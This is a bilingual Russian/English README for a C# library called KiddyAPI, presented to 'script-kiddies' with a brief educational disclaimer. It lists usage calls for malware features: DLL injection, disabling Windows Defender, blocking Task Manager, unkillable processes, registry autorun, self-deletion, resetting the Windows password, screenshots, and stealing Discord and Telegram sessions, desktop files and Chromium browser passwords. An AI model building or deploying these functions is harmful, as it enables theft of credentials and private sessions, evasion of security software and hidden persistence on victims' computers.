# KiddyAPI
KiddyAPI создана от "скрипт-кидди" для "скрипт-кидди". Библиотека, для изучения не очень правильных методов работы с Windows OS.

KiddyAPI is created from script-kiddies for script-kiddies. Library for learning not very correct methods of working with Windows.

Тестировалась на Win7 x64. В ближайшем времени буду добавлять еще функций.

Tested on Win7 x64. In the near future I will add more features.
## Отказ от ответственности: / Denial of responsibility: 
Данная библиотека была написана в образовательных целях, автор не несет ответственности за использование в других целях.

This library was written for educational purposes; the author is not responsible for use for other purposes.

Использовать только на своих компьютерах или с разрешения пользователя

Use only on their computers or with the permission of the user
## Нэймспэйсы и методы / Namespaces and methods:
### Info:
Получаем активное окно пользователя по заголовку / Get the active user window by title :
```C# 
CheckWindow.GetWindow("example");
```
Задаем новый пароль на Windows / Set a new password on Windows:
```C# 
SystemWork.ChangeWinPass("example");
```
Получаем внешний IP адрес / Get external IP address:
```C# 
SystemWork.GetIP();
``` 
Получаем информацию о необходимых модулях / Get information about the required modules :
```C# 
SystemWork.GetInfo(WinClass,ClassItem);
```
Получаем MAC-адресс / Get MAC Address: 
```C# 
SystemWork.GetMacAddress();
``` 
Получаем скриншот экрана / Get a screenshot of the screen:
```C# 
SystemWork.GetScreen("C:\\example");
```
### Injector:
Инжектим в процесс C++ DLL / Injecting into the C ++ DLL process:
```C# 
Injector.Execute("pathToDLL", Process);
```
### Config:
Класс для дальнейших наработок, пока особо ничего в него не писал

Проверяем, под админом ли запущенны :
```C#  
if(Config.IsAdmin) { blablabla } 
```
### Protect:
Отключаем Windows Defender - `DisableDefender.FirstRun();` - Используется при первом запуске программы,
затем используем `DisableDefender.CheckDefender();` в бесконечном цикле, для того что бы проверять, не изменились ли параметры

Disable Windows Defender - `DisableDefender.FirstRun ();` - Used when first running the program,
then use `DisableDefender.CheckDefender ();` in an infinite loop to check if the parameters have changed

Закрываем программу, если запущен какой то процесс / Close the program if some process is running. :
```C# 
HideModule.CheckProcess("example");
```
Блокируем/Разблокируем Диспетчер задач / Lock / Unlock Task Manager :
```C#
 HideModule.EnableTaskManager(true/false);
```
Самоудаляемся / SelfDelete : 
```C# 
HideModule.Suicide("pathToOwnExe");`
```
Добавляем в автозагрузку( через реестр ) / Autorun:
```C# 
HideModule.SetAutorun("имя, которое будет отображаться в реестре", "pathToFile");
```
Делаем процесс невозможным убить в Диспетчере задач / Make the process impossible to kill in the Task Manager:
```C# 
ProcessProtect.Protect();
```
### Steal :

Тут мы копируем файлы с рабочего стола/сессию Дискорда/сессию Телеграмма / Here we copy files from the desktop / Discord session / Telegram session:

Общий вид такой :
```C# 
 Apps.Desktop/Telegram/Discord/.Steal("pathToCopy", true/false("перезапись старых файлов, если уже есть");
```

Расшифровываем пароли с ChromiumBased браузеров / Decrypt passwords from ChromiumBased browsers :
```C# 
`Browsers.DecryptBrowsers(byte[] "пароль из бд",byte[]"энтропия");` 
```
Граббер добавлять не стал, так как это уже жирно. Декрипт происходит через WinAPI функцию.


